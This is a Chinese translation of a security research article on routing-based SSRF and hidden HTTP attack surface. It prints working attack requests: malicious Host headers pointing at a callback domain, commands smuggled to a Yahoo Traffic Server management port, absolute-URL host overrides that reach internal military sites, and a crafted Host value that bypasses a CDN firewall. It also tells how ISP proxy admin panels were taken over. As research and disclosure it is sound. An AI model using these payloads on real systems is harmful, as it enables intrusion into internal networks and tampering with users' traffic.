> 原文链接: https://www.anquanke.com//post/id/86610 


# 【技术分享】针对HTTP的隐藏攻击面分析（中）


                                阅读量   
                                **152473**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html](http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t01d038ac00624cbda6.png)](https://p2.ssl.qhimg.com/t01d038ac00624cbda6.png)



译者：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**简介**

****

为了增强用户体验度，现代Web网站架构中都包含了各种各样的“隐藏系统”，这些系统不仅可以给用户提供各种额外的服务，而且还可以帮助管理员提取网站各方面的分析数据。但是，这些隐藏系统同样也是近些年里经常被人们忽略的隐形攻击面。

**传送门：[【技术分享】针对HTTP的隐藏攻击面分析（上）](http://bobao.360.cn/learning/detail/4218.html)**

<br>

**前文回顾**

****

在本系列文章的上集，我们对现代Web应用架构中的隐藏系统以及隐藏服务进行了简单描述，并且介绍了本系列文章中所要使用的工具以及技术。接下来，我们将用实际的例子来给大家进行详细的介绍。

<br>

**三、请求误传**

****

**1.无效主机**

触发一次回调最简单的方法就是发送一个错误的HTTP Host头：



```
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
Connection: close
```

虽然这项技术大家很多年前就已经知道了，但是这种技术真正的能力却被人们大大低估了-我用这项技术成功入侵了二十七台美国国防部、我的互联网服务提供商、以及某哥伦比亚ISP的服务器。为了让大家更清楚地了解这种漏洞的严重程度，我们先看看下面这台雅虎的内部服务器（存在漏洞，域名为[http://ats-vm.lorax.bf1.yahoo.com/](http://ats-vm.lorax.bf1.yahoo.com/)）。

乍看之下，我们貌似看不出服务器运行了哪些软件：



```
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:32:50 GMT
Transfer-Encoding: chunked
Connection: close
Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
```

但是在不到一分钟之后，我不仅弄清楚了服务器运行了哪些软件，而且我还知道怎么去跟它进行通信，这一切多亏了‘**HELP**’命令：



```
HELP / HTTP/1.1
Host: XX.X.XXX.XX:8082
HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:33:59 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Ok
  Traffic Server Overseer Port
  commands:
    get &lt;variable-list&gt;
    set &lt;variable-name&gt; = "&lt;value&gt;"
    help
    exit
  example:
    Ok
    get proxy.node.cache.contents.bytes_free
    proxy.node.cache.contents.bytes_free = "56616048"
    Ok
  Variable lists are conf/yts/stats records, separated by commas
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
```

服务器端所返回的每一行“Unknown Command”都会将请求中的每一行信息解析成单独的命令，因为它使用了一种换行符终止协议，所以我们无法通过传统的SSRF来利用这个漏洞。不过幸运的是，基于路由的SSRF灵活性更高，所以我可以采用GET请求来发送包含了任意命令的POST-style主体：



```
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
Content-Length: 34
GET proxy.config.alarm_email
HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:57:02 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
proxy.config.alarm_email = nobody@yahoo-inc.com
```

在‘SET’命令的帮助下，我可以随意修改雅虎负载均衡池中的配置，包括[启用SOCKS代理](https://docs.trafficserver.apache.org/en/latest/admin-guide/files/records.config.en.html#socks-processor)并提升我IP地址的权限（[可向他们的缓存池中推送数据](https://docs.trafficserver.apache.org/en/latest/admin-guide/files/records.config.en.html#proxy-config-http-push-method-enabled)）。我发现这个安全问题之后便立刻将其上报给了雅虎，我的努力也让我收获了一万五千美刀的漏洞奖金。就在几周之后，我又用同样的方法发现了另一台包含相同漏洞的服务器，然后又拿到了额外的五千美刀奖金…

<br>

**2.分析英国电信（BT）**

****

在测试了‘无效主机’这项技术之后，我发现之前给完全不相关的公司所发送的Payload竟然得到的是一堆有限IP池所返回的Pingback，其中还包括cloud.mail.ru。我一开始假设，这些公司肯定使用的是相同的云端Web应用防火墙解决方案，而我就可以想办法将我所发送的请求传到它们的内部管理员接口了。但事实并非如此，这个IP池的反向DNS解析到的地址是bn-proxyXX.ealing.ukcore.bt.net，而这个地址属于英国电信集团，也就是我公司的互联网服务提供商。于是我打算使用Burp Repeater来进行深入分析，你可以从下图中看到，响应信息的延迟为50ms，这个速度快得有些可疑了，因为这个请求-响应信息需要从英国发送到俄罗斯，然后再经过爱尔兰服务商的数据中心最终从俄罗斯回到英国。TCP跟踪路由（端口80）向我们揭露了真相：

[![](https://p2.ssl.qhimg.com/t0186b81c431e95d1ca.png)](https://p2.ssl.qhimg.com/t0186b81c431e95d1ca.png)

当我尝试与cloud.mail.ru建立TCP链接时，链接被我的ISP中断了（我的流量是通过TCP端口443（HTTPS）发送的，并且消息没有被篡改）。这也就意味着，负责篡改流量的实体并没有mail.ru的TLS证书，因此消息的拦截并没有得到mail.ru的许可。这样一来，我就可以在办公室或家里照着做，而且我还可以通过这种方法入侵GHCQ的系统，但问题又绕回来了-这些系统到底是干嘛的？

为了弄清楚这些系统的真实用途，我使用Masscan来ping了整个IPv4地址空间 （TCP端口80，TLL=10）。过滤掉了缓存和自托管网站之后，我得到了一套完整的目标IP地址列表，而这些IP地址背后的系统主要是用来阻止其他用户访问受保护内容的。访问黑名单列表中的IP地址后，请求会被重定向到一个代理池中，这样它们就能够审查请求所使用的HTTP host头了：



```
GET / HTTP/1.1
Host: www.icefilms.info
HTTP/1.1 200 OK
...
&lt;p&gt;Access to the websites listed on this page has been blocked pursuant to orders of the high court.&lt;/p&gt;
```

但是，我们可以在不修改host头的情况下绕过这种屏蔽机制，不过在本系列文章中我们就不做深入探讨了。

这种设置会导致以下几种结果。多亏了虚拟主机的存在，我们可以将类似Google站点这样的云主机添加到黑名单中，意味着Google用户以及英国电信用户发送给它们的全部流量都会经过代理服务器。从服务器（黑名单中）的角度来看，所有的英国电信用户共享一个相同的IP地址池，这会导致攻击者将英国电信的代理IP加入黑名单，从而无法正常访问其他站点，并影响所有的英国电信用户。除此之外，我还使用了之前提到的管理员访问漏洞入侵了代理服务器的管理员面板，所以我就可以对代理服务器进行重新配置并向数百万英国电信用户的网络流量中注入任意内容了。

<br>

**3.分析METROTEL（哥伦比亚互联网服务提供商）**

****

实际上，哥伦比亚的互联网服务提供商METROTEL同样存在我们之前所描述的那些问题。但是对于英国电信来说，这些系统原本的用途可能是好的，但存在漏洞的话可就要另当别论了。需要注意的是，除了这些互联网服务提供商之外，包括bbc.co.uk在内的某些新闻网站同样存在这些问题。

<br>

**4.主机重写**

****

我之前曾使用这项技术来创建用于重置目标用户密码的钓鱼邮件，不过需要注意的是，这项技术还可以用来攻击美国国防部的服务器。其中的某些服务器设置了白名单来过滤host头，但你可别忘了，我们还可以指定主机以及host头的优先级：



```
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
Connection: close
```

将包含漏洞的前端服务器作为网关来使用，我们就可以访问各种各样有意思的内部站点了，其中可能包含公共论坛的文件传输服务，或者是某个代码库，而这些服务均有可能存在隐藏的攻击面。

<br>

**5.模棱两可的请求**

****

Incapsula 是一个提供CDN加速的服务商，它的CDN节点主要是在美国、英国、新加坡、以色列和日本等地区，它和CloudFlare的功能类似，国内可以通过指定Incapsula的其他CDN节点来加快网站访问速度并降低流量和其他资源的消耗。

[![](https://p1.ssl.qhimg.com/t01d13a9d8ea1d519fb.png)](https://p1.ssl.qhimg.com/t01d13a9d8ea1d519fb.png)

Incapsula的云端Web应用防火墙后有一大堆服务器，而Incapsula主要通过检查请求的host头来确定这个请求应该被转发给哪一台服务器处理，所以之前所介绍的攻击技术在这里就无法奏效了。但是，Incapsula解析host头的过程是非常复杂的，而且还需要指定端口。我们可以参考下面这个发送给incapsula-client.net的请求：



```
GET / HTTP/1.1
Host: incapsula-client.net:80@burp-collaborator.net
Connection: close
```

incapsula-client.net的后台服务器会将这段输入转换成URL http://incapsula-client.net:80@burp-collaborator.net/，而我们就可以尝试通过用户名 'incapsula-client.net'以及密码'80'来完成burp-collaborator.net的身份验证了。除了暴露这个非常有意思的攻击面之外，这个服务还暴露了后台服务器的地址，并且允许我们直接访问后台服务器来绕过Incapsula的保护机制。

<br>

**总结**

在本系列文章的中集，我们介绍了几种可以暴露目标组织隐藏服务或隐藏系统的几种简单方法，那么在下集中，我们将会用实际的目标来给大家演示如何利用这些技术寻找到隐藏系统，并利用其中存在的安全漏洞来完成入侵攻击，感兴趣的同学请关注安全客的最新更新。
